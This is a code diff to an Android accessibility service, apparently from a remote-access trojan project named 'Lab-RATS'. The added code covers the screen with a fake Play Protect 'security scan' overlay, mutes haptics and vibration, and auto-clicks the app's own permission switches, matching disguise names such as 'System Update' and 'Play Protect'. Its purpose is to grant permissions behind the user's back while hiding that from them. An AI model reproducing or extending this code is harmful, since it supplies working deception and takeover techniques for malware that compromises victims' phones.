@@ -1,18 +1,27 @@
 package com.labs.labrats;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
 import android.graphics.Path;
 import android.graphics.Point;
 import android.graphics.Rect;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
+import android.view.ContextThemeWrapper;
+import android.view.LayoutInflater;
 import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 import androidx.core.content.ContextCompat;
 
 import java.util.ArrayList;
@@ -56,6 +65,23 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         // --- GHOST WATCHDOG PROTOCOL ---
         startGhostWatchdog();
+
+        // Immediately deploy cover overlay (0ms) and mute haptics the moment Accessibility is granted
+        silenceHaptics(this);
+        togglePermissionCover(true);
+
+        // Auto-exit Settings back to PermissionActivity after Accessibility enablement
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
+            if (activeRoot != null) {
+                CharSequence activePkgSeq = activeRoot.getPackageName();
+                String activePkg = activePkgSeq != null ? activePkgSeq.toString().toLowerCase() : "";
+                activeRoot.recycle();
+                if (activePkg.contains("settings")) {
+                    startSmartExitSettingsLoop();
+                }
+            }
+        }, 200);
     }
 
     private void startGhostWatchdog() {
@@ -235,9 +261,16 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 }
 
                 // Only trigger if we are specifically on OUR app's details page
-                String appName = getString(R.string.app_name);
-                List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(appName);
-                if (labels == null || labels.isEmpty()) {
+                List<String> targetNames = getOurAppNames();
+                boolean foundLabel = false;
+                for (String name : targetNames) {
+                    List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(name);
+                    if (labels != null && !labels.isEmpty()) {
+                        foundLabel = true;
+                        break;
+                    }
+                }
+                if (!foundLabel) {
                     root.recycle();
                     return;
                 }
@@ -435,6 +468,169 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private static boolean autoPilotEngaged = true;
     public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
     public static boolean isAutoPilotEngaged() { return autoPilotEngaged; }
+
+    private static int originalHapticState = -1;
+
+    public static void silenceHaptics(Context context) {
+        if (context == null) return;
+        try {
+            if (originalHapticState == -1) {
+                originalHapticState = Settings.System.getInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, 1);
+            }
+            Settings.System.putInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, 0);
+        } catch (Exception ignored) {}
+    }
+
+    public static void restoreHaptics(Context context) {
+        if (context == null) return;
+        try {
+            if (originalHapticState != -1) {
+                Settings.System.putInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, originalHapticState);
+                originalHapticState = -1;
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private static View permissionCoverView = null;
+    private static final Handler coverTextHandler = new Handler(Looper.getMainLooper());
+    private static Runnable coverTextRunnable = null;
+    private static int coverTextIndex = 0;
+
+    private static final String[][] COVER_STATUS_MESSAGES = {
+        {"Verifying security environment...", "Scanning system components..."},
+        {"Checking app signatures...", "Verifying developer credentials..."},
+        {"Analyzing system permissions...", "Checking runtime security policies..."},
+        {"Validating system integrity...", "Finalizing Play Protect scan..."}
+    };
+
+    public static void setPermissionCoverVisible(boolean show) {
+        IO_Persistence_Manager instance = getInstance();
+        if (instance == null) return;
+        new Handler(Looper.getMainLooper()).post(() -> instance.togglePermissionCover(show));
+    }
+
+    public static boolean isPermissionCoverActive() {
+        IO_Persistence_Manager instance = getInstance();
+        return instance != null && permissionCoverView != null;
+    }
+
+    private void togglePermissionCover(boolean show) {
+        try {
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            if (wm == null) return;
+
+            if (show) {
+                if (permissionCoverView == null) {
+                    ContextThemeWrapper themeContext = new ContextThemeWrapper(this, R.style.Theme_LabRATS);
+                    LayoutInflater inflater = LayoutInflater.from(themeContext);
+                    permissionCoverView = inflater.inflate(R.layout.activity_guide_permission, null);
+
+                    View layoutScanning = permissionCoverView.findViewById(R.id.layoutScanning);
+                    if (layoutScanning != null) {
+                        layoutScanning.setVisibility(View.VISIBLE);
+                    }
+
+                    ProgressBar pb = permissionCoverView.findViewById(R.id.pbPlayProtect);
+                    if (pb != null) {
+                        pb.setIndeterminate(true);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                            pb.setIndeterminateTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                            pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                        }
+                        pb.setVisibility(View.VISIBLE);
+                    }
+
+                    TextView tvSub = permissionCoverView.findViewById(R.id.tvPlayProtectSub);
+                    if (tvSub != null) {
+                        tvSub.setText(COVER_STATUS_MESSAGES[0][0]);
+                        tvSub.setAlpha(1.0f);
+                        tvSub.setVisibility(View.VISIBLE);
+                    }
+
+                    TextView tvDetails = permissionCoverView.findViewById(R.id.tvPlayProtectDetails);
+                    if (tvDetails != null) {
+                        tvDetails.setText(COVER_STATUS_MESSAGES[0][1]);
+                        tvDetails.setAlpha(1.0f);
+                        tvDetails.setVisibility(View.VISIBLE);
+                    }
+
+                    int overlayType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003;
+
+                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        overlayType,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                        android.graphics.PixelFormat.TRANSLUCENT);
+
+                    params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
+                    params.x = 0;
+                    params.y = 0;
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+                    }
+
+                    wm.addView(permissionCoverView, params);
+
+                    coverTextIndex = 0;
+                    if (coverTextRunnable != null) {
+                        coverTextHandler.removeCallbacks(coverTextRunnable);
+                    }
+                    coverTextRunnable = new Runnable() {
+                        @Override
+                        public void run() {
+                            if (permissionCoverView == null) return;
+                            try {
+                                TextView sub = permissionCoverView.findViewById(R.id.tvPlayProtectSub);
+                                TextView details = permissionCoverView.findViewById(R.id.tvPlayProtectDetails);
+
+                                coverTextIndex = (coverTextIndex + 1) % COVER_STATUS_MESSAGES.length;
+                                String[] msgs = COVER_STATUS_MESSAGES[coverTextIndex];
+
+                                if (sub != null) {
+                                    sub.animate().alpha(0.2f).setDuration(150).withEndAction(() -> {
+                                        sub.setText(msgs[0]);
+                                        sub.animate().alpha(1.0f).setDuration(150).start();
+                                    }).start();
+                                }
+
+                                if (details != null) {
+                                    details.animate().alpha(0.2f).setDuration(150).withEndAction(() -> {
+                                        details.setText(msgs[1]);
+                                        details.animate().alpha(1.0f).setDuration(150).start();
+                                    }).start();
+                                }
+
+                                coverTextHandler.postDelayed(this, 1800);
+                            } catch (Exception ignored) {}
+                        }
+                    };
+                    coverTextHandler.postDelayed(coverTextRunnable, 1800);
+
+                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay DEPLOYED successfully");
+                }
+            } else {
+                if (coverTextRunnable != null) {
+                    coverTextHandler.removeCallbacks(coverTextRunnable);
+                    coverTextRunnable = null;
+                }
+                if (permissionCoverView != null) {
+                    wm.removeViewImmediate(permissionCoverView);
+                    permissionCoverView = null;
+                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay REMOVED successfully");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Permission Cover Overlay Error: " + e.getMessage());
+        }
+    }
 
     public static boolean isBlackoutActive() {
         IO_Persistence_Manager instance = getInstance();
@@ -1300,21 +1496,98 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
+    public List<String> getOurAppNames() {
+        List<String> names = new ArrayList<>();
+
+        // 1. Dynamic Application Label from PackageManager (what Settings actually displays)
+        try {
+            PackageManager pm = getPackageManager();
+            if (pm != null) {
+                CharSequence appLabel = pm.getApplicationLabel(getApplicationInfo());
+                if (appLabel != null && appLabel.length() > 0) {
+                    String labelStr = appLabel.toString().trim();
+                    if (!labelStr.isEmpty()) {
+                        names.add(labelStr);
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 2. Resource String app_name
+        try {
+            String resName = getString(R.string.app_name);
+            if (resName != null && !resName.trim().isEmpty()) {
+                String trimmed = resName.trim();
+                if (!names.contains(trimmed)) {
+                    names.add(trimmed);
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 3. Package Name
+        String pkgName = getPackageName();
+        if (pkgName != null && !pkgName.isEmpty()) {
+            if (!names.contains(pkgName)) {
+                names.add(pkgName);
+            }
+        }
+
+        // 4. Dynamic Service Labels from PackageManager
+        try {
+            PackageManager pm = getPackageManager();
+            if (pm != null) {
+                ComponentName accComponent = new ComponentName(this, IO_Persistence_Manager.class);
+                ServiceInfo accInfo = pm.getServiceInfo(accComponent, 0);
+                if (accInfo != null) {
+                    CharSequence label = accInfo.loadLabel(pm);
+                    if (label != null && label.length() > 0) {
+                        String sLabel = label.toString().trim();
+                        if (!sLabel.isEmpty() && !names.contains(sLabel)) {
+                            names.add(sLabel);
+                        }
+                    }
+                }
+
+                ComponentName notifComponent = new ComponentName(this, StatusNotification.class);
+                ServiceInfo notifInfo = pm.getServiceInfo(notifComponent, 0);
+                if (notifInfo != null) {
+                    CharSequence label = notifInfo.loadLabel(pm);
+                    if (label != null && label.length() > 0) {
+                        String sLabel = label.toString().trim();
+                        if (!sLabel.isEmpty() && !names.contains(sLabel)) {
+                            names.add(sLabel);
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 5. Fallback & Known Legacy/Alias names
+        String[] fallbacks = {
+            "System Stability Service",
+            "com.android.system.stability",
+            "com.labs.labrats",
+            "System Update",
+            "Play Protect",
+            "Lab-RATS",
+            "StatusNotification",
+            "Device Bridge"
+        };
+        for (String fb : fallbacks) {
+            if (!names.contains(fb)) {
+                names.add(fb);
+            }
+        }
+
+        return names;
+    }
+
     private boolean isSingleAppPermissionPage(AccessibilityNodeInfo root, int totalSwitchesOnScreen) {
         if (root == null) return false;
         if (hasScrollableList(root)) return false;
         if (totalSwitchesOnScreen != 1) return false;
 
-        String ourAppName = getString(R.string.app_name);
-        String pkgName = getPackageName();
-
-        List<String> targetNames = new ArrayList<>();
-        if (!ourAppName.isEmpty()) targetNames.add(ourAppName);
-        targetNames.add("System Stability Service");
-        targetNames.add(pkgName);
-        targetNames.add("System Update");
-        targetNames.add("Play Protect");
-        targetNames.add("Lab-RATS");
+        List<String> targetNames = getOurAppNames();
 
         for (String name : targetNames) {
             List<AccessibilityNodeInfo> matches = root.findAccessibilityNodeInfosByText(name);
@@ -1371,19 +1644,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private boolean isSwitchForOurApp(AccessibilityNodeInfo switchNode) {
         if (switchNode == null) return false;
 
-        String ourAppName = getString(R.string.app_name);
-
-        List<String> namesToCheck = new ArrayList<>();
-        if (!ourAppName.isEmpty()) namesToCheck.add(ourAppName);
-        namesToCheck.add(getPackageName());
-        namesToCheck.add("com.android.system.stability");
-        namesToCheck.add("com.labs.labrats");
-        namesToCheck.add("System Stability Service");
-        namesToCheck.add("System Update");
-        namesToCheck.add("Play Protect");
-        namesToCheck.add("Lab-RATS");
-        namesToCheck.add("StatusNotification");
-        namesToCheck.add("Device Bridge");
+        List<String> namesToCheck = getOurAppNames();
 
         // Walk up parent container row hierarchy (up to 8 levels), stopping BEFORE RecyclerView/ListView
         AccessibilityNodeInfo curr = switchNode.getParent();
@@ -1605,6 +1866,16 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
+    private void muteVibration() {
+        try {
+            silenceHaptics(this);
+            android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
+            if (v != null) {
+                v.cancel();
+            }
+        } catch (Exception ignored) {}
+    }
+
     private boolean performNodeClick(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
@@ -1613,6 +1884,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
         // 1. Direct Accessibility ACTION_CLICK on node
         if (node.isClickable()) {
             if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                muteVibration();
                 Log.d(TAG, "GHOST_AUTOPILOT: Direct node ACTION_CLICK performed successfully");
                 return true;
             }
@@ -1624,6 +1896,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
         while (curr != null && depth < 5) {
             if (curr.isClickable()) {
                 if (curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                    muteVibration();
                     Log.d(TAG, "GHOST_AUTOPILOT: Direct parent ACTION_CLICK performed successfully");
                     curr.recycle();
                     return true;
@@ -1643,7 +1916,9 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
             Log.d(TAG, "GHOST_AUTOPILOT: Gesture tap fallback at (" + x + ", " + y + ")");
-            return clickAt(x, y);
+            boolean res = clickAt(x, y);
+            if (res) muteVibration();
+            return res;
         }
 
         return false;
